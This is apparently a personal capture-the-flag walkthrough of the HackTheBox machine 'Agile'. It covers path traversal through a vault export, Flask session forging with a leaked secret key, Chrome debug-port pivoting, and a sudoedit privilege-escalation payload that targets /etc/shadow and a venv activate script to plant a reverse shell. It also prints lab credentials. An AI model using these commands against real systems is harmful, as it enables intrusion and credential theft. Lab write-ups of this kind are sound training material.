## RUSTSCAN:
`PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
|   256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.4 (94%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=3/6%OT=22%CT=%CU=35428%PV=Y%DS=2%DC=T%G=N%TM=640598E9%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 46.821 days (since Wed Jan 18 12:58:10 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   33.17 ms 10.10.14.1
2   33.30 ms agile (10.129.171.74)`

From our Network enumeration we found that website points to another webdomain which is superpass.htb so we should add that to our hosts file and move forward with enumeration. 
* * *
## SSH:
SSH version is new that's why we can move on because we won't find any exploitation for this service. We may want to come back as soon we find proper credentials.
* * *
## HTTP:
So far we found that website is pointing to superpass.htb and not agile.htb as we tought, so far surfing the webisite we find that is about a Password manager.
Checking manuall the HTML code for possible Comment or lefovers shows us nothing, but we can map that there is a login portal:
![9c7ac84e78c5d66a055c0793120e01c2.png](../../../_resources/9c7ac84e78c5d66a055c0793120e01c2.png)

Checking manually for subdomains shows us nothing:
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://superpass.htb -H "Host:FUZZ.superpass.htb" -fl 8
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.0.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://superpass.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.superpass.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________
:: Progress: [114441/114441] :: Job [1/1] :: 1197 req/sec :: Duration: [0:01:42] :: Errors: 0 ::`

Trying to fuzz for webdirectories shows us a console but we need to be authenticated first:
![ea9133c16d3fdacd4dfd6d392439b537.png](../../../_resources/ea9133c16d3fdacd4dfd6d392439b537.png)

Trying to manually sign up it throws up a sql error where we can find juicy informations:
![a979634653cdc84faee6a15fde58544f.png](../../../_resources/a979634653cdc84faee6a15fde58544f.png)

Let's map the whole site with Burpsuite and move forward. Trying to add another username but this time with user **test:test** and we are in:
![9acb2731701430479c4f1c6ade857872.png](../../../_resources/9acb2731701430479c4f1c6ade857872.png)

Wondering if we can do some SQLi since when i tried before my password had a ! and it thrown an error. I tried to run SQLmap on the login page but it didn't gave us anything.
Trying to play a bit with the password vault i added a test password and tried to to an export:
![5b46646b162611a3e70f47806da5f0d4.png](../../../_resources/5b46646b162611a3e70f47806da5f0d4.png)
![0838bf505c362eef08dd976410794187.png](../../../_resources/0838bf505c362eef08dd976410794187.png)

As we see we could maybe use that export function to download specific files?
![a6a6fcd2c4881111d828a6c66131d7a6.png](../../../_resources/a6a6fcd2c4881111d828a6c66131d7a6.png)

Absolute path didn't work but what about one step back?
![410e8c120613c4bf0e15a14c6f93337e.png](../../../_resources/410e8c120613c4bf0e15a14c6f93337e.png)

yeah we can read from passwd several usernames like dev_admin, runner, corum, edwards and root!
Now since LFI is a "blind" exploit we have to hunt for Paths in envirom/cmdline to hunt for path so we know what do we need to read in order to escalate to a user.
We can start by reading the enviromental variable:
![da9b650d9bbb7a299bad0f89f1147620.png](../../../_resources/da9b650d9bbb7a299bad0f89f1147620.png)

And the cmdline :
![ca8df2e359fee5368f5e73b951546ec9.png](../../../_resources/ca8df2e359fee5368f5e73b951546ec9.png)

Now going back to the error message we get when we try to dump a file that is inexistent, we can find that it points to several paths
![1bb43c822986875103e36a301f3c0293.png](../../../_resources/1bb43c822986875103e36a301f3c0293.png)
Which is the default one that is not leaking anything usefull but scrolling thru the error response we can find the real application code:
![c26550e8d9fbad108b6c1429d258666d.png](../../../_resources/c26550e8d9fbad108b6c1429d258666d.png)
![cc06115ea7dea6499ebf105868bc3d0a.png](../../../_resources/cc06115ea7dea6499ebf105868bc3d0a.png)
Knowing that is a flask app and the other errors are pointing to: "/app/app/superpass/views/vault_views.py"
We can assume that real source code is pointing to: ""/app/app/superpass/app.py"
![4e277417143af584790a2ef8969f45e5.png](../../../_resources/4e277417143af584790a2ef8969f45e5.png)

Can we read the source code of the application?
![19cfa8e59b2ef02ae2a859497f12658b.png](../../../_resources/19cfa8e59b2ef02ae2a859497f12658b.png)

YES! And we have the Secret key, which means we should be able to craft tokens for ourself..
We could use this to decode our tokens: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign
Using the session cookie with Decode option we can see the toke structure:
![17d2d9e3ebe665ab53cc94d42a2c187f.png](../../../_resources/17d2d9e3ebe665ab53cc94d42a2c187f.png)
![10a8b37d5dfd6b36977685fac2d7c414.png](../../../_resources/10a8b37d5dfd6b36977685fac2d7c414.png)

Having the secret key we could sign the new session token as another user ID:
![4cdeaa13ee5d55bb2bfdab25964c118a.png](../../../_resources/4cdeaa13ee5d55bb2bfdab25964c118a.png)
![2c50e21d71e1cee59710679a2ceb8de0.png](../../../_resources/2c50e21d71e1cee59710679a2ceb8de0.png)
Now I will start by going backwards, we had ID:9 will do 8 untill we find the right user.. So far the only ID whom showed up something interesting where ID: 1 and 2
Respectively:
![46e1dee1004d365931635c8f6b748e55.png](../../../_resources/46e1dee1004d365931635c8f6b748e55.png)
![9584c21db7d075fb9557ccd47a5f7627.png](../../../_resources/9584c21db7d075fb9557ccd47a5f7627.png)

From these I see that the only one hash that seems good is the last one from ID:2 which indeed matches with username: Corum and URL is Agile which is btw the Hostname of the machine.
`corum:5db7caa1d13cc37c9fc2`

And using it as password let's us in!
![93b818b09ba7cf4db62fd309d3fe51e6.png](../../../_resources/93b818b09ba7cf4db62fd309d3fe51e6.png)
* * *
## USER.txt:
After we suggessfully logged in as Corum via ssh can grab the first flag:
![946bde6e019513e0ce6e5c49de1ae312.png](../../../_resources/946bde6e019513e0ce6e5c49de1ae312.png)
* * *
## ROOT.txt
So far trying to list what can corum do, he don't hold any sudo rights:
![851d8b1202c1ebd2a33b5969b728a960.png](../../../_resources/851d8b1202c1ebd2a33b5969b728a960.png)

And he can't surf any other home forlders:
![6fe4c1be6be95c6a0bb4b6b5a7b54219.png](../../../_resources/6fe4c1be6be95c6a0bb4b6b5a7b54219.png)

Now let's upload Linpeas and check what can we find juicy in the system that can help us priviledge escalate!
![d1af87e4a6ac88f750215f5a129f7f7a.png](../../../_resources/d1af87e4a6ac88f750215f5a129f7f7a.png)
So far seems like that cred file can be read only by dev_admin
![0e489fc993a2397891954b25e06c366e.png](../../../_resources/0e489fc993a2397891954b25e06c366e.png)

So far here I had no idea about what do to so I have uploaded a simple python script that checks for open ports: https://github.com/pinkeshcanva/Open-Port-Scanner
![8a928db2ef9c3d22a05dcaee04b3fd0c.png](../../../_resources/8a928db2ef9c3d22a05dcaee04b3fd0c.png)

Here I missed it had to check for tips, but linpeas actually found us something juicy so I missed it since it was already showing as Yellow/red:
![41b887e55a7c15eedb6483b1d3fa4755.png](../../../_resources/41b887e55a7c15eedb6483b1d3fa4755.png)

Basically the user "Runner"  runs chrome with Remote debugging port pointing on 41829 as we've seen this port is open from our scan but only internally which means we can use reverse ssh to open that port to us...
On our machine we can use Port Forward with ssh to forward the Chrome debut port to our machine so it can be forwarded via localhost:xxxxx'
![d6d6e0c6c6dc0a4a6ee60d6e4fb3e555.png](../../../_resources/d6d6e0c6c6dc0a4a6ee60d6e4fb3e555.png)

Now I googled about how to use the Remote debug port on Chrome: https://stackoverflow.com/questions/56326924/debugging-a-chrome-instance-with-remote-debugging-port-flag
![06c4d5a1dcf22b911030c92627994d94.png](../../../_resources/06c4d5a1dcf22b911030c92627994d94.png)

So going into chrome://inspect/#devices and adding localhost:41829 into "Discover Network targets":
![6eabd6600f94fb670ca9483e6c9f7489.png](../../../_resources/6eabd6600f94fb670ca9483e6c9f7489.png)

Did the trick by letting us see new targets via our localhost:
![9ecc9f9a38b9cb334e8469573eba3f3f.png](../../../_resources/9ecc9f9a38b9cb334e8469573eba3f3f.png)

Here I had to check for tips and apparently we can surf the website remotely from our Chrome. Just click inspect:
![a959b62b6a0850c06782415f1de65832.png](../../../_resources/a959b62b6a0850c06782415f1de65832.png)

So far nothing strange, but if we try to login now by surfing to /vault:
![ebd04325c970de65b7c81fdd49af7574.png](../../../_resources/ebd04325c970de65b7c81fdd49af7574.png)

Now we have edwards password...
<td>agile</td>
<td>edwards</td>
<td>d07867c6267dcb5df0af</td>

Now we are in:
![0e4dc7cd100c9d9841eff525a751b9b7.png](../../../_resources/0e4dc7cd100c9d9841eff525a751b9b7.png)

Now checkin manually for what can Edwards do with sudo we can see that he can do a bunch of stuff:
![64f0f93b3bf94d48b78aed303d96a6d1.png](../../../_resources/64f0f93b3bf94d48b78aed303d96a6d1.png)

Which means he can run sudoedit (usefull to edit some files only) as dev_admin user:group
Doing so we can now read that credentials file:
`edwards:1d7ffjwrx#$d6qn!9nndqgde4`

And we can maybe grab some mysql creds?
`{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}`

Again those are the open ports on the machine:
`Enter the host to scan: 127.0.0.1
Port 22 is open.
Port 80 is open.
Port 3306 is open.
Port 5000 is open.
Port 5555 is open.
Port 33060 is open.
Port 34613 is open.
Port 34746 is open.
Port 41829 is open.`

Loggin in locally with credentials from the /app/config_test.json file we can login into port 3306 locally:
![c60bcd7ebdd98bcddb917a58fc5a27a5.png](../../../_resources/c60bcd7ebdd98bcddb917a58fc5a27a5.png)

Let's try to enumerate content of the custom DB:
![0309cda74c1f5b8e250ece6d8a88c92c.png](../../../_resources/0309cda74c1f5b8e250ece6d8a88c92c.png)

Apparently this is already what we got from the Chrome remote test site... Which means this was a Rabbit hole.
Now I checked back for tips and apparently from a Linpeas scan as Edwin we can get some Privesc suggested on sudo:
`╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.9.9
╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-0847
Potentially Vulnerable to CVE-2022-2588
`

Even here apparently the PE went under radar since it is so fresh, basically that version of sudo 1.9.9 is vulnerable to this CVE: https://tonyharris.io/posts/sudoedit/
Basically we know that we have sudoedit permissions and we have sudo version 1.9.9

We form our payload with Editor:
![628e93c3c237a76c282c5ca97befd180.png](../../../_resources/628e93c3c237a76c282c5ca97befd180.png)
![fbbf81be9505b44d8a3fd86470f469f6.png](../../../_resources/fbbf81be9505b44d8a3fd86470f469f6.png)
`EDITOR='nano -- /etc/shadow' sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`

Edit: this will not work, at least in the way is explained in the links, since sudoedit only allows file owned by dev_admin user/group we can Read/Write only those, where instead all the examples on Web are mentioning ALL:ALL.
So if we check all the files owned by user Dev_admin:
![803a72c5cc337f6a935908ba13b55f1f.png](../../../_resources/803a72c5cc337f6a935908ba13b55f1f.png)
The User haven't any interesting file but the group does well:
![46d3e1fe30243e437cb725841db11831.png](../../../_resources/46d3e1fe30243e437cb725841db11831.png)

And know checking the /bin/activate in the Python virtual environment:
![caccf66ee7a1291daee0f7773a9fe185.png](../../../_resources/caccf66ee7a1291daee0f7773a9fe185.png)

Now we could use that sudo exploit to write a Busybox revshell in /bin/activate maybe?
Forming again the payload: `EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`
We supply Edwins password and we are in:
![3a328e7284f69ec6b69c21fac41439b0.png](../../../_resources/3a328e7284f69ec6b69c21fac41439b0.png)
Now i will add 2 different revshells to increase possibility to succed if NC is not available on the machine:
![b216d97af46cefdb9581413fa394ab3a.png](../../../_resources/b216d97af46cefdb9581413fa394ab3a.png)

And indeed it worked out with the bash revshell listening on the port 6666:
![c2c42e20e17f79f6d22e5d8127509c75.png](../../../_resources/c2c42e20e17f79f6d22e5d8127509c75.png)

Now we can grab last flag:
![3819d5bc7c3c39a63870e934b4028def.png](../../../_resources/3819d5bc7c3c39a63870e934b4028def.png)
* * *
